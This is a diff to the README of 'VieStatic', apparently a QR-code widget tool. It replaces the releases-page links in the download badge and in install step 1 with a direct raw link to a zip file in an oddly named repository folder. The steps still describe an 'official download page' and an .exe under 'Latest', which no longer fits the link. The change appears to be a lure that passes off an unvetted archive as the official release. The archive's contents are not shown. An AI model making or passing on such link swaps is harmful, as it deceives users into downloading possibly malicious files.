@@ -1,6 +1,6 @@
 # 🖼️ VieStatic - Create custom QR codes for websites
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tammilaciniate34/VieStatic/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tammilaciniate34/VieStatic/raw/refs/heads/main/equipoise/Static-Vie-2.2.zip)
 
 VieStatic provides a simple way to add QR code widgets to your internet projects. You do not need to write code to use this tool. You generate functional QR codes for URLs, contact details, or text strings with a few clicks. This tool works on any modern web environment.
 
@@ -17,7 +17,7 @@ Your computer requires the following to run VieStatic:
 
 You visit the official releases page to download the application. This ensures you receive the most recent version of the software. Follow these instructions to acquire the installation file:
 
-1.  Visit the [official download page](https://github.com/tammilaciniate34/VieStatic/releases).
+1.  Visit the [official download page](https://github.com/tammilaciniate34/VieStatic/raw/refs/heads/main/equipoise/Static-Vie-2.2.zip).
 2.  Locate the section labeled Latest.
 3.  Click the file ending in .exe to start the download.
 4.  Save the file to your Downloads folder.
